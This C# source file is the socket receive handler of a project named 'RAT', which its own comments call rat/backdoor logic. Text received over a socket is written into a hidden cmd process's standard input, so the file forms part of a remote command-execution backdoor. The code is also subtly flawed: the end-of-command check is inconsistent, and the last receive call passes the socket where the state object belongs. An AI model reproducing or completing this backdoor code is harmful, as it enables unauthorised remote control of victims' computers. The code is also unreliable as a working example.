using RAT.src.Interfaces;
using RAT.src.Models;
using System;
using System.Net.Sockets;
using System.Text;

namespace RAT.src.Sockets.Connection
{
    /// <summary>
    /// Handles client connection stage over socket.
    /// </summary>
    public class SocketConnectionReceiveLogic : ISocketConnectionReceiveLogic
    {
        private ISocketStateLogic _socketStateLogic { get; }
        private ISocketConnectionDisconnectLogic _socketConnectionDisconnectLogic { get; }
        private IRatCommandLogic _ratCommandLogic { get; }

        /// <summary>
        /// Handles client connection stage over socket.
        /// </summary>
        /// <param name="stateLogic">Our client state logic.</param>
        /// <param name="disconnectLogic">Disconnection logic for client.</param>
        /// <param name="ratCommandLogic">Our rat/backdoor command logic.</param>
        public SocketConnectionReceiveLogic(
            ISocketStateLogic stateLogic,
            ISocketConnectionDisconnectLogic disconnectLogic,
            IRatCommandLogic ratCommandLogic)
        {
            _socketStateLogic = stateLogic;
            _socketConnectionDisconnectLogic = disconnectLogic;
            _ratCommandLogic = ratCommandLogic;
        }

        /// <summary>
        /// Socket receival logic handling.
        /// </summary>
        /// <param name="res">Status of asynchronous operation.</param>
        public void OnReceive(IAsyncResult res)
        {
            // Read data from the client socket.
            (Socket socket, StateObject state) = _socketStateLogic.GetSocketAndStateFromAsyncResult(res);

            int bytesRead = 0;
            try
            {
                bytesRead = socket.EndReceive(res);
            }
            catch (SocketException)
            {
                // If some error occured during receival, then we are disconnecting client but preserving socket and connection,
                // so he could connect again immediately (in case if some error occured on his side).
                socket.BeginDisconnect(reuseSocket: true, _socketConnectionDisconnectLogic.OnDisconnect, state);
                return;
            }

            // There might be more data, so store the data received so far.
            state.DataBuilder.Append(Encoding.ASCII.GetString(state.DataArray, 0, bytesRead));
            string content = state.DataBuilder.ToString();
            if (string.IsNullOrEmpty(content))
            {
                return;
            }

            // Check for end of command character (new line) in client command. If it is not there, read
            // more data.
            if (!content.Contains("\n") && content.Contains("<EOF>"))
            {
                // Not all data received. Get more.
                socket.BeginReceive(state.DataArray, 0, state.DataArray.Length, 0, OnReceive, state);
            }
            else
            {
                // Check if this is RAT related command
                if (_ratCommandLogic.IsRatCommand(_socketStateLogic.State.DataBuilder.ToString()))
                {
                    // Fill here after refactoring
                }
                else
                {
                    // If this is not RAT command, then execute cmd command.
                    _socketStateLogic.State.ClientCmdProcess.StandardInput.WriteLine(
                        Encoding.Default.GetString(state.DataArray));

                    // Clear state data after command execution.
                    state.DataBuilder.Clear(); // Command is stored here in string format.
                    state.DataArray = new byte[1024]; // Command is stored here in byte command.
                }
            }

            // Continue on listening for other commands.
            socket.BeginReceive(
                state.DataArray,
                0,
                state.DataArray.Length,
                SocketFlags.None,
                OnReceive,
                socket);
        }
    }
}